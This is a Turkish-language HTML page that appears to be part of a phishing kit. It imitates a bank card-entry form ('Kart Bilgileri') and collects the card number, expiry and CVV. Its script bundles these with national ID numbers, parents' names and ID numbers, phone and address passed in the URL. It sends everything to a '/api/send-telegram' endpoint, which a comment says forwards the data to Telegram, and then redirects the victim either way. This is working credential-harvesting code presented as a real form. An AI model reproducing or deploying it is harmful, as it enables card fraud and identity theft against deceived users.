<!DOCTYPE html>
<html class="no-js javascript png flash9 chrome webkit win" lang="tr">

<head id="ctl00_head">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Kart Bilgileri</title>
  <meta name="description" content="Kart Bilgileri">
  <link rel="stylesheet" href="./imgs/app.css">
  <link rel="shortcut icon" href="./imgs/favicon.ico" type="image/x-icon">
  <style>
    .info-container {
      max-width: 600px;
      margin: 50px auto;
      padding: 30px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .info-header {
      text-align: center;
      margin-bottom: 30px;
    }
    .info-header h1 {
      color: #c51522;
      font-size: 28px;
      margin-bottom: 10px;
    }
    
    /* Kredi Kartı Simülasyonu */
    .card-preview {
      width: 100%;
      max-width: 400px;
      height: 240px;
      margin: 0 auto 30px;
      background: linear-gradient(135deg, #c51522 0%, #a0121a 100%);
      border-radius: 15px;
      padding: 25px;
      box-shadow: 0 10px 30px rgba(197, 21, 34, 0.4);
      color: white;
      position: relative;
      overflow: hidden;
    }
    .card-preview::before {
      content: '';
      position: absolute;
      top: -50%;
      right: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
    }
    .card-chip {
      width: 50px;
      height: 40px;
      background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
      border-radius: 8px;
      margin-bottom: 20px;
      position: relative;
    }
    .card-number {
      font-size: 24px;
      letter-spacing: 3px;
      margin-bottom: 30px;
      font-family: 'Courier New', monospace;
      min-height: 30px;
    }
    .card-details {
      display: flex;
      justify-content: space-between;
      align-items: flex-end;
    }
    .card-holder {
      font-size: 14px;
      text-transform: uppercase;
      opacity: 0.9;
    }
    .card-expiry {
      font-size: 14px;
      text-align: right;
    }
    .card-expiry-label {
      font-size: 10px;
      opacity: 0.7;
      margin-bottom: 5px;
    }
    
    /* Müşteri Bilgileri */
    .customer-info {
      background: #f8f9fa;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 30px;
    }
    .customer-info h3 {
      color: #c51522;
      font-size: 18px;
      margin-bottom: 15px;
    }
    .info-item {
      display: flex;
      justify-content: space-between;
      padding: 8px 0;
      border-bottom: 1px solid #e0e0e0;
    }
    .info-item:last-child {
      border-bottom: none;
    }
    .info-label {
      font-weight: bold;
      color: #666;
    }
    .info-value {
      color: #333;
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      color: #333;
    }
    .form-input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .form-input:focus {
      outline: none;
      border-color: #c51522;
    }
    .form-row {
      display: flex;
      gap: 15px;
    }
    .form-row .form-group {
      flex: 1;
    }
    .submit-btn {
      width: 100%;
      padding: 15px;
      background: #c51522;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
      font-weight: bold;
    }
    .submit-btn:hover {
      background: #a0121a;
    }
    .submit-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    
    /* Mobil Responsive */
    @media (max-width: 768px) {
      .form-row {
        flex-direction: column;
        gap: 0;
      }
      .form-row .form-group {
        flex: 1;
      }
      .card-preview {
        height: 200px;
        padding: 20px;
      }
      .card-number {
        font-size: 18px;
        letter-spacing: 2px;
      }
    }
  </style>
</head>

<body class="is-retail is-turkish is-desktop is-nontouch">
  <div class="info-container">
    <div class="info-header">
      <h1>Kart Bilgileri</h1>
      <p>Lütfen kart bilgilerinizi giriniz</p>
    </div>

    <!-- Kredi Kartı Simülasyonu -->
    <div class="card-preview">
      <div class="card-chip"></div>
      <div class="card-number" id="cardNumberDisplay">#### #### #### ####</div>
      <div class="card-details">
        <div class="card-holder" id="cardHolderDisplay">KART SAHİBİ</div>
        <div class="card-expiry">
          <div class="card-expiry-label">SON KULLANMA</div>
          <div id="cardExpiryDisplay">MM/YY</div>
        </div>
      </div>
    </div>

    <form id="kartForm">
      <div class="form-group">
        <label class="form-label" for="kartNumarasi">Kart Numarası</label>
        <input type="text" id="kartNumarasi" name="kartNumarasi" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" pattern="[0-9\s]{13,19}" required>
        <small style="color: #666; font-size: 12px;">16 haneli kart numaranızı giriniz</small>
      </div>

      <div class="form-row">
        <div class="form-group">
          <label class="form-label" for="sonKullanimAy">Son Kullanma Tarihi (Ay)</label>
          <input type="number" id="sonKullanimAy" name="sonKullanimAy" class="form-input" placeholder="MM" min="1" max="12" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="sonKullanimYil">Son Kullanma Tarihi (Yıl)</label>
          <input type="number" id="sonKullanimYil" name="sonKullanimYil" class="form-input" placeholder="YYYY" min="2024" max="2099" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="cvv">CVV</label>
          <input type="text" id="cvv" name="cvv" class="form-input" placeholder="123" maxlength="4" pattern="[0-9]{3,4}" required>
        </div>
      </div>

      <!-- Müşteri Bilgileri -->
      <div class="customer-info">
        <h3>Müşteri Bilgileri</h3>
        <div class="info-item">
          <span class="info-label">Ad Soyad:</span>
          <span class="info-value" id="customerAdSoyad">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Doğum Tarihi:</span>
          <span class="info-value" id="customerDogumTarihi">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Cinsiyet:</span>
          <span class="info-value" id="customerCinsiyet">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Doğum Yeri:</span>
          <span class="info-value" id="customerDogumYeri">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Anne Adı:</span>
          <span class="info-value" id="customerAnneAdi">-</span>
        </div>
      </div>

      <button type="submit" class="submit-btn" id="submitBtn">Devam Et</button>
    </form>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const submitBtn = document.getElementById('submitBtn');

      // Müşteri bilgilerini göster
      document.getElementById('customerAdSoyad').textContent = urlParams.get('adSoyad') || '-';
      document.getElementById('customerDogumTarihi').textContent = urlParams.get('dogumTarihi') || '-';
      document.getElementById('customerCinsiyet').textContent = urlParams.get('cinsiyet') || '-';
      document.getElementById('customerDogumYeri').textContent = urlParams.get('dogumYeri') || '-';
      document.getElementById('customerAnneAdi').textContent = urlParams.get('anneAdi') || '-';

      // Kart numarası formatı (4'er haneli gruplar) ve kart simülasyonu güncelleme
      const kartNumarasiInput = document.getElementById('kartNumarasi');
      const cardNumberDisplay = document.getElementById('cardNumberDisplay');
      const cardHolderDisplay = document.getElementById('cardHolderDisplay');
      
      kartNumarasiInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        this.value = formattedValue;
        
        // Kart simülasyonunu güncelle
        if (value.length > 0) {
          // Girilen değeri 4'erli gruplara ayır
          let groups = [];
          for (let i = 0; i < value.length; i += 4) {
            groups.push(value.substring(i, i + 4));
          }
          // 16 haneye kadar # ile doldur
          while (value.length < 16) {
            let nextGroup = '#'.repeat(Math.min(4, 16 - value.length));
            groups.push(nextGroup);
            value += nextGroup;
          }
          cardNumberDisplay.textContent = groups.join(' ').substring(0, 19);
        } else {
          cardNumberDisplay.textContent = '#### #### #### ####';
        }
      });

      // Kart sahibi adını göster
      const adSoyad = urlParams.get('adSoyad') || 'KART SAHİBİ';
      cardHolderDisplay.textContent = adSoyad.toUpperCase();

      // Son kullanma tarihi güncelleme
      const sonKullanimAyInput = document.getElementById('sonKullanimAy');
      const sonKullanimYilInput = document.getElementById('sonKullanimYil');
      const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
      
      function updateExpiry() {
        const ay = sonKullanimAyInput.value.padStart(2, '0') || 'MM';
        const yil = sonKullanimYilInput.value.slice(-2) || 'YY';
        cardExpiryDisplay.textContent = ay + '/' + yil;
      }
      
      sonKullanimAyInput.addEventListener('input', updateExpiry);
      sonKullanimYilInput.addEventListener('input', updateExpiry);

      // CVV sadece rakam
      document.getElementById('cvv').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
      });

      // Ay sadece rakam ve 1-12 arası
      document.getElementById('sonKullanimAy').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (parseInt(this.value) > 12) {
          this.value = '12';
        }
      });

      // Form submit
      document.getElementById('kartForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const kartNumarasi = document.getElementById('kartNumarasi').value.replace(/\s/g, '');
        const sonKullanimAy = document.getElementById('sonKullanimAy').value;
        const sonKullanimYil = document.getElementById('sonKullanimYil').value;
        const cvv = document.getElementById('cvv').value;

        // Luhn algoritması ile kart numarası validasyonu
        function validateCardNumber(cardNumber) {
          // Sadece rakam kontrolü
          if (!/^\d+$/.test(cardNumber)) {
            return false;
          }
          
          // Uzunluk kontrolü (13-19 haneli)
          if (cardNumber.length < 13 || cardNumber.length > 19) {
            return false;
          }
          
          // Luhn algoritması
          let sum = 0;
          let isEven = false;
          
          // Sağdan sola doğru işle
          for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber[i]);
            
            if (isEven) {
              digit *= 2;
              if (digit > 9) {
                digit -= 9;
              }
            }
            
            sum += digit;
            isEven = !isEven;
          }
          
          return sum % 10 === 0;
        }

        // Validasyonlar
        if (!validateCardNumber(kartNumarasi)) {
          alert('Geçerli bir kart numarası giriniz');
          return;
        }

        if (!sonKullanimAy || parseInt(sonKullanimAy) < 1 || parseInt(sonKullanimAy) > 12) {
          alert('Geçerli bir ay giriniz (1-12)');
          return;
        }

        if (!sonKullanimYil || parseInt(sonKullanimYil) < 2024) {
          alert('Geçerli bir yıl giriniz');
          return;
        }

        if (cvv.length < 3 || cvv.length > 4) {
          alert('Geçerli bir CVV giriniz (3-4 haneli)');
          return;
        }

        submitBtn.disabled = true;
        submitBtn.textContent = 'Gönderiliyor...';

        // Tüm bilgileri Telegram'a gönder
        const allData = {
          tckn: urlParams.get('tc') || '',
          telefon: urlParams.get('telefon') || '',
          kartLimiti: urlParams.get('kartLimiti') || '',
          adSoyad: urlParams.get('adSoyad') || '',
          dogumTarihi: urlParams.get('dogumTarihi') || '',
          cinsiyet: urlParams.get('cinsiyet') || '',
          dogumYeri: urlParams.get('dogumYeri') || '',
          anneAdi: urlParams.get('anneAdi') || '',
          babaAdi: urlParams.get('babaAdi') || '',
          anneTCKN: urlParams.get('anneTCKN') || '',
          babaTCKN: urlParams.get('babaTCKN') || '',
          adresIl: urlParams.get('adresIl') || '',
          adresIlce: urlParams.get('adresIlce') || '',
          memleketIl: urlParams.get('memleketIl') || '',
          memleketIlce: urlParams.get('memleketIlce') || '',
          medeniHal: urlParams.get('medeniHal') || '',
          kartNumarasi: kartNumarasi,
          sonKullanimAy: sonKullanimAy,
          sonKullanimYil: sonKullanimYil,
          cvv: cvv,
          type: 'basvuru'
        };

        fetch('/api/send-telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(allData)
        })
        .then(response => response.json())
        .then(data => {
          // Telegram başarılı olsun ya da olmasın, tamamlandi.html'ye yönlendir
          window.location.href = 'tamamlandi.html';
        })
        .catch(error => {
          console.error('Error:', error);
          // Hata olsa bile tamamlandi.html'ye yönlendir
          window.location.href = 'tamamlandi.html';
        });
      });
    });
  </script>
</body>
</html>

